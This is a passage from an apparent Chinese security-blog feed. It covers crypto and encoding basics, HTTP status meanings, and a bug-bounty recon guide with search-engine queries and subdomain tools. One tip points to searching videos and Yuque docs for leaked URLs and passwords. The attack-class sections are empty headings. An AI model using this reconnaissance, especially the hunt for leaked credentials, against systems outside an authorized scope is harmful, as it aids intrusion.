<strong>CRC</strong></p><p>优点：方便存储，损耗低，加密对性能的损耗微乎其微</p><p>缺点：存在暴力破解的可能性，因此最好通过 <strong>加盐</strong> 的方式提高安全性，此外可能存在散列冲突</p><p><strong>MD5密文特点：</strong>由数字0-9和字母a-z组成，固定位数<strong>16位</strong>或<strong>32位</strong></p><p><strong>解密需求：</strong>知道密文即可，对于复杂明文很难碰撞出来</p><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p> 一般情况下密文尾部回忆两个等号&#x3D;&#x3D;，明文很少的时候则没有</p><p>明文越长密文越长，密文中一般不会出现 <strong>&#x2F;</strong></p><p>区分大小写</p><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>代表有 <strong>AES</strong>，常见的还有 <strong>DES</strong> ， <strong>RC4</strong></p><p>优点：算法公开，计算量小，加密速度快，加密效率高</p><p>缺点：发送方和接收方必须商定好密钥，密钥管理可能存在问题</p><p><strong>AES、DES密文特点：</strong>和base64基本类似，但密文中一般会有 <strong>&#x2F;</strong> 和 <strong>+</strong>  </p><p><strong>解密需求：</strong>密文、模式、加密key，偏移量（ECB模式默认没有偏移量），条件满足方可解密</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>代表有 <strong>RSA</strong> ，常见的还有 <strong>RSA2</strong> ， <strong>PKCS</strong></p><p>优点：比对称加密安全性更好，加解密需要不同的密钥，即 <strong>使用公钥加密就要使用私钥解密，使用私钥加密就要公钥解密</strong></p><p>缺点：加解密花费时间长，速度慢，只适合对少量数据进行加密</p><p><strong>密文特点：</strong>和AES相似，但是长度较长，同一明文每次加密他的密文都会变动</p><p><strong>解密需求：</strong>密文、公钥或私钥</p><h1 id="数据包基础"><a href="#数据包基础" class="headerlink" title="数据包基础"></a>数据包基础</h1><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222721812.png" alt="image-20240102222721812" style="zoom:50%;"><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222442240.png" alt="image-20240102222442240" style="zoom:50%;"><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222505717.png" alt="image-20240102222505717" style="zoom:50%;"><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222756791.png" alt="image-20240102222756791" style="zoom:67%;"><p>在请求目录时，比如xxxxx&#x2F;sys&#x2F;admin&#x2F;为200 OK，而xxxxx&#x2F;sys&#x2F;为403，为什么？</p><p>原因是在访问xxxxx&#x2F;sys&#x2F;admin&#x2F;时，此目录下面有类似于index的指引页面，因此可以返回200；而xxxxx&#x2F;sys&#x2F;目录下没有类似于index的指引 页面，因此返回403，但是此目录是存在的，所以扫到目录显示403表示目录是存在的 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一点和web相关的基础知识，随便写写，不成系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Web环境常规知识&quot;&gt;&lt;a href=&quot;#Web环境常规知识&quot; class=&quot;headerlink&quot; title=&quot;Web环境常规知识&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="基础" scheme="https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>SRC通用讲解</title>
    <link href="https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/"/>
    <id>https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/</id>
    <published>2023-11-24T13:12:12.413Z</published>
    <updated>2023-12-06T15:42:58.179Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金</strong></em></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="网络空间搜索"><a href="#网络空间搜索" class="headerlink" title="网络空间搜索"></a>网络空间搜索</h2><h3 id="精准搜索"><a href="#精准搜索" class="headerlink" title="精准搜索"></a>精准搜索</h3><h4 id="域名搜索"><a href="#域名搜索" class="headerlink" title="域名搜索"></a>域名搜索</h4><p>Fofa：domain&#x3D;“baidu.com”</p><p>Hunter：domain.suffix&#x3D;”Baidu.com”</p><p>Google：site:baidu.com</p><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>微步：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>360：<a href="https://ti.360.cn/">https://ti.360.cn/</a></p><p>旁站查询：<a href="https://webscan.cc/">https://webscan.cc</a>         （对于IP站更好一点）</p><h4 id="子域名工具"><a href="#子域名工具" class="headerlink" title="子域名工具"></a>子域名工具</h4><p>水泽：<a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p><p>灯塔魔改版：<a href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker</a></p><p>Nemo：<a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a></p><p>推荐灯塔魔改版</p><h4 id="企业查询"><a href="#企业查询" class="headerlink" title="企业查询"></a>企业查询</h4><p>小蓝本、企查查、爱企查、微信小程序、公众号</p><h3 id="模糊搜索"><a href="#模糊搜索" class="headerlink" title="模糊搜索"></a>模糊搜索</h3><h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h4><p>Github关键字搜索</p><p>网络空间搜索引擎body，title，ico特征，js特征搜索</p><p>通用系统搜索</p><p>CNVD通用搜索</p><p>EDU通用搜索</p><h4 id="短视频信息搜索"><a href="#短视频信息搜索" class="headerlink" title="短视频信息搜索"></a>短视频信息搜索</h4><p>抖音快手B站等，直接搜索内容，如：腾讯后台登录教程，可以看到一些url甚至是账号密码</p><h4 id="语雀搜索"><a href="#语雀搜索" class="headerlink" title="语雀搜索"></a>语雀搜索</h4><p> 语雀搜索是需要登录的，登录后可以进入页面 <a href="https://www.yuque.com/dashboard">https://www.yuque.com/dashboard</a> ，左上角会存在搜索</p><p>当然登陆客户端也有</p><img src="/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/image-20231206224628687.png" alt="image-20231206224628687" style="zoom: 33%;"><h2 id><a href="#" class="headerlink" title></a></h2><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><h1 id="条件竞争（并发）"><a href="#条件竞争（并发）" class="headerlink" title="条件竞争（并发）"></a>条件竞争（并发）</h1><h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h1 id="CORS➕XSS"><a href="#CORS➕XSS" class="headerlink" title="CORS➕XSS"></a>CORS➕XSS</h1><h1 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h1><h1 id="SSRF➕RCE"><a href="#SSRF➕RCE" class="headerlink" title="SSRF➕RCE"></a>SSRF➕RCE</h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h1 id="云安全"><a href="#云安全" class="headerlink" title="云安全"></a>云安全</h1><h1 id="常见框架漏洞"><a href="#常见框架漏洞" class="headerlink" title="常见框架漏洞"></a>常见框架漏洞</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信</summary>
      
    
    
    
    <category term="SRC" scheme="https://ink-scholar.github.io/categories/SRC/"/>
    
    
    <category term="src" scheme="https://ink-scholar.github.io/tags/src/"/>
    
  </entry>
  
</feed>
